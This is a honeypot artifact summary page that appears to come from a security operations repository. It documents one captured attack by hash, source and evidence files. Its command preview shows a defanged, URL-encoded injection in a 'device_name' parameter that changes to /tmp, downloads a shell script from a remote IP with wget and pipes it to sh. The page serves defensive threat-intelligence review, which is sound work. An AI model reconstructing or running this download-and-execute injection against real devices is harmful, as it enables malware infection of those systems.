# 90f909985346dd8a7447e60f7b7a37acc8028695e07c1116b6a3078e8e25273c

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `90f909985346dd8a7447e60f7b7a37acc8028695e07c1116b6a3078e8e25273c` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
device_name=cd%20/tmp%3Bwget%20hxxp://91[.]92[.]40[.]XXX/wget.sh%20-O-%7Csh%20-s%20lwps%3Bbusybox%20wget%20hxxp://91[.]92[.]40[.]XXX
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
